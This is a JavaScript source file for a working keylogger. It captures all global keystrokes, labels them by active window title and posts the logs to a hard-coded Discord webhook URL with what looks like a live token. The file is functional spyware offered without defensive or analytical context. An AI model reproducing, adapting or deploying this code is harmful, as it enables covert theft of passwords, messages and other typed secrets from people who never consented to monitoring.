const { GlobalKeyboardListener } = require("node-global-key-listener");
const axios = require("axios");
const activeWin = require("active-win");

const v = new GlobalKeyboardListener();
let shiftDown = false, altDown = false, keyLogs = "", lastActiveWindow;

function formatKey(key, isShiftPressed) {
    const specialKeys = {
        "tab": "<TAB>", "return": "<ENTER>", "space": " ", "escape": "<ESC>",
        "delete": "<DEL>", "backspace": "<B.SPACE>", "dot": isShiftPressed ? ">" : ".",
        "semicolon": isShiftPressed ? ":" : ";", "minus": isShiftPressed ? "_" : "-",
        "equals": isShiftPressed ? "+" : "=", "home": "<HOME>", "ins": "<INSERT>",
        "print screen": "<P.SCREEN>", "section": isShiftPressed ? "~" : "`",
        "square bracket open": isShiftPressed ? "{" : "[", "square bracket close": isShiftPressed ? "}" : "]",
        "backslash": isShiftPressed ? "|" : "\\", "page up": "<PG.UP>", "caps lock": "<CAPSLOCK>",
        "quote": isShiftPressed ? "\"" : "'", "page down": "<PG.DOWN>", "comma": isShiftPressed ? "<" : ",",
        "forward slash": isShiftPressed ? "?" : "/", "end": "<END>", "left ctrl": "<LEFT.CTRL>",
        "left meta": "<LEFT.META>", "right ctrl": "<RIGHT.CTRL>", "left arrow": "<LEFT.ARROW>",
        "right arrow": "<RIGHT.ARROW>", "up arrow": "<UP.ARROW>", "down arrow": "<DOWN.ARROW>"
    };
    return specialKeys[key] || (isShiftPressed ? key.toUpperCase() : key);
}

v.addListener((e, down) => {
    const key = e.name.toLowerCase();
    const isKeyUp = e.state === "UP";
    const isKeyDown = e.state === "DOWN";

    if (isKeyDown && (key === "left shift" || key === "right shift")) shiftDown = true;
    if (isKeyUp && (key === "left shift" || key === "right shift")) shiftDown = false;
    if (isKeyDown && (key === "left alt" || key === "right alt")) altDown = true;
    if (isKeyUp && (key === "left alt" || key === "right alt")) altDown = false;

    if (isKeyUp) {
        if (key === "left shift" || key === "right shift" || key === "left alt" || key === "right alt") {
            keyLogs += "";
        } else {
            const formattedKey = formatKey(key, shiftDown);
            process.stdout.write(formattedKey);
            keyLogs += formattedKey;
        }
    }
});

async function checkWindowChange() {
    try {
        const windowInfo = await activeWin();
        if (!windowInfo) return console.log("No active window found.");

        if (lastActiveWindow && lastActiveWindow !== windowInfo.title) {
            await sendToDiscord(windowInfo.title, lastActiveWindow);
        }
        lastActiveWindow = windowInfo.title;
    } catch (error) {
        console.error("Error getting active window:", error);
    }
}

async function sendToDiscord(currentTitle, previousTitle) {
    try {
        if (keyLogs.trim() !== "") {
            const content = `\`\`\`[Current Window: ${previousTitle}] \nKeylog: ${keyLogs}\`\`\``;
            await axios.post("https://discord.com/api/webhooks/1232576457264336896/MlHLmkI7C_1CFRmietTGDnMtVJ2uEEnbL7y4jREvni1ph5gOWHu_l1SAYWLiG-IhbKNW?fbclid=IwAR0GH4pqjmDRhQQGn9NIpxZkI7E-msK0RTTNRvTrrVSUYJth_kDilWrzbEw", { content });
            keyLogs = "";  
        }
    } catch (error) {
        console.error("Error sending to Discord:", error);
    }
}

setInterval(checkWindowChange, 1000);
